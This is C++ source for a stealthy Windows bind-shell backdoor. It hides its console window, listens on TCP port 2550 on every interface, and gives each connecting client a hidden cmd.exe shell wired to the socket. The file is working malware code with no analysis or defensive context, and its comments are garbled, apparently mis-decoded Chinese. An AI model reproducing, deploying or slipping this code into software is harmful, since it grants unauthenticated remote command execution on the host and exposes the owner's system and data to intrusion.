#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#include <winsock2.h>
#include <windows.h>

#define MasterPort 2550 // �ŧi�ݤf

int main(int argc, char *argv[])
{
    HWND hWnd = GetConsoleWindow(); // �������x�������y�`
    ShowWindow(hWnd, SW_HIDE); // ���õ���
    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET CSocket, SSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFOW StartupInfo; // �ϥ� STARTUPINFOW�]Unicode�����^
    wchar_t* szCMDPath = new wchar_t[256];  // �ϥ� wchar_t
    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW)); // ��l�Ƭ� STARTUPINFOW
    ZeroMemory(&WSADa, sizeof(WSADATA));

    // �ϥ� GetEnvironmentVariableW �Ө��o CMD ���|
    GetEnvironmentVariableW(L"COMSPEC", szCMDPath, 256);

    WSAStartup(0x0202, &WSADa);

    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(MasterPort);
    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));
    listen(CSocket, 5);
    iAddrSize = sizeof(SockAddrIn);

    while ((SSocket = accept(CSocket, (sockaddr *)&SockAddrIn, &iAddrSize))) {
        StartupInfo.cb = sizeof(STARTUPINFOW);  // �קאּ STARTUPINFOW ���c��j�p
        StartupInfo.wShowWindow = SW_HIDE;
        StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        StartupInfo.hStdInput = (HANDLE)SSocket;
        StartupInfo.hStdOutput = (HANDLE)SSocket;
        StartupInfo.hStdError = (HANDLE)SSocket;

        // �ϥ� CreateProcessW
        CreateProcessW(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);

        WaitForSingleObject(ProcessInfo.hProcess, INFINITE);  // ���ݶi�{����
        CloseHandle(ProcessInfo.hProcess);
        CloseHandle(ProcessInfo.hThread);
        closesocket(SSocket);
    }

    closesocket(CSocket);
    WSACleanup();

    delete[] szCMDPath;  // �O�o����ʺA���t���O����

    return 0;
}
